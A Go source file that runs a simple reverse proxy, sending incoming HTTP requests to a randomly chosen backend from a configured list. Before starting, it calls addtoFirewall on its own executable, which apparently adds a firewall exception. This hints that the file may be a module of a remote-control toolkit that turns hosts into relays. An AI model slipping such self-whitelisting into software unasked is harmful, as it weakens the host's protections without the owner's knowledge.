package components

import (
	"fmt"
	"math/rand"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const (
	DEFAULT_SERVER_TIMEOUT = 30
)

type (
	BackendServer struct {
		Proxy *httputil.ReverseProxy
		Url   *url.URL
	}
)

var (
	port           string
	backends       string
	backendServers []*BackendServer
)

func handle(w http.ResponseWriter, req *http.Request) {
	backendServer, err := getBackendServer()
	if err != nil {
		fmt.Fprint(w, err.Error())
		return
	}

	NewDebugUpdate("Proxying request for " + req.URL.String() + " to backend server with address: " + backendServer.Url.String())

	backendServer.Proxy.ServeHTTP(w, req)
}

func getBackendServer() (*BackendServer, error) {
	if len(backendServers) == 0 {
		return nil, fmt.Errorf("No backend servers available :(")
	}

	return backendServers[rand.Intn(len(backendServers))], nil
}

func parseBackends() {
	splitBackends := strings.Split(backends, ",")

	for _, backend := range splitBackends {
		backend = strings.Trim(backend, " ")

		match, _ := regexp.MatchString("^(?:https?:)?//", backend)
		if match == false {
			backend = "http://" + backend
		}

		backendUrl, err := url.Parse(backend)
		if err != nil || len(backend) == 0 {
			continue
		}

		backendServer := &BackendServer{
			Proxy: httputil.NewSingleHostReverseProxy(backendUrl),
			Url:   backendUrl,
		}

		backendServers = append(backendServers, backendServer)
	}

}

func startProxServer() {
	mux := http.NewServeMux()

	server := &http.Server{}

	server.Addr = ":" + port
	server.Handler = mux
	server.ReadTimeout = time.Duration(DEFAULT_SERVER_TIMEOUT) * time.Second
	server.WriteTimeout = time.Duration(DEFAULT_SERVER_TIMEOUT) * time.Second

	mux.Handle("/", http.HandlerFunc(handle))

	NewDebugUpdate("Proxy Server running on port " + port)

	go server.ListenAndServe()
}

func ProxSrvLoad(myport, yourbackends string) {
	if addtoFirewall(myName, os.Args[0]) {
	}
	port = myport
	backends = yourbackends

	parseBackends()

	startProxServer()
}
